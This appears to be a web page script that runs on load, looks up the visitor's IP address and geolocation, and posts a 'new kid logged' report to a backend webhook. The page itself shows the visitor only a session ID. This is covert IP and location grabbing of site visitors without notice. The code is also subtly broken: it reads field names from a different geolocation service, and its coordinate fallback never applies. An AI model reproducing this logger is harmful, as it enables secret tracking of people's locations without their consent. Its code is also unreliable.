const sessionId = crypto.randomUUID() || Date.now().toString(36) + Math.random().toString(36).slice(2);

(async () => {
    try {
        const info = await fetch('https://ipinfo.io/json').then(res => res.json());

        // Extract values with fallback
        const ip = info.query || 'Unknown';
        const city = info.city || 'Unknown';
        const region = info.regionName || 'Unknown';
        const country = info.country || 'Unknown';
        const loc = info.lat + "," + info.lon || 'Unknown';
        const org = info.as || 'Unknown';
        const time = new Date().toISOString();

        // Construct message
        const message =
            "# new kid logged\n" +
            "```" + sessionId + "```\n" +
            "**IP:** `" + ip + "`\n" +
            "**city:** `" + city + "`\n" +
            "**region:** `" + region + "`\n" +
            "**country:** `" + country + "`\n" +
            "**coords:** `" + loc + "`\n" +
            "**org:** `" + org + "`\n" +
            "**time:** `" + time + "`";
        ;

        // Send to backend
        await fetch('/api/sendwebhook', {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ message })
        });

        document.getElementById("sessionLabel").textContent = "Session ID: " + sessionId;

    } catch (err) {
        console.error("Logging failed:", err);
    }
})();